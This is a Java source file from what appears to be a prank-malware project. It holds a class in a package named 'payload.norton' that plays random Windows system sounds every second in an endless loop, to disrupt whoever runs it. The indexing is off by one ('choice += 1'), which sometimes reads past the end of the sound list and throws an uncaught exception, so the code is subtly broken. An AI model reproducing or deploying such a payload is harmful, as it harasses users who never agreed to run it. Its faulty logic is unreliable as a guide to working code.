package me.brandonyb.jazzsnazz.payload.norton;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;

import javax.sound.sampled.AudioSystem;
import javax.sound.sampled.Clip;
import javax.sound.sampled.LineUnavailableException;
import javax.sound.sampled.UnsupportedAudioFileException;

import me.brandonyb.jazzsnazz.util.Analyser;
import me.brandonyb.jazzsnazz.util.EntryType;
import me.brandonyb.jazzsnazz.util.Logging;
import me.brandonyb.jazzsnazz.util.OS;

/**
 * <p>The thread that plays random Windows Default sounds based on chance.</p>
 * @author brandon
 */
public class Sound extends Thread {
	private final Random random = new Random();
	
	/**
	 * <p>List of available WAV files within a directory.</p>
	 * @param directory The specified folder
	 * @return A list of available WAV files
	 */
	private List<String> soundFiles(String directory) {
		List<String> soundFiles = new ArrayList<String>();
		
		// Iterate through the folder contents and add all files that end in .wav to the array
		for (final File file : new File(directory).listFiles()) {
			if (file.getName().toLowerCase().endsWith(".wav")) {
				soundFiles.add(file.getName());
			}
		}
		
		return soundFiles;
	}
	
	@Override
	public void run() {
		Analyser analyser = new Analyser();
		
		// Verify that the operating system is Windows to access the sounds
		if (analyser.getOS() == OS.WINDOWS) {
			while (true) {
				try {
					// Select a random sound file
					int choice = random.nextInt(this.soundFiles("C:\\Windows\\Media").size());
					choice += 1;
					
					// Play the randomly-selected sound file
					try {
						Clip clip = AudioSystem.getClip();
						clip.open(AudioSystem.getAudioInputStream(new File("C:\\Windows\\Media\\" + this.soundFiles("C:\\Windows\\Media").get(choice))));
						clip.start();
					} catch (LineUnavailableException | IOException | UnsupportedAudioFileException ex) {
						Logging logging = new Logging();
						logging.addEntry(EntryType.WARNING, "Unable to play the sound.");
					}
					
					Thread.sleep(1000);
				} catch (InterruptedException ex) {
					Logging logging = new Logging();
					logging.addEntry(EntryType.WARNING, "Unable to sleep the Sound thread.");
				}
			}
		}
	}
}
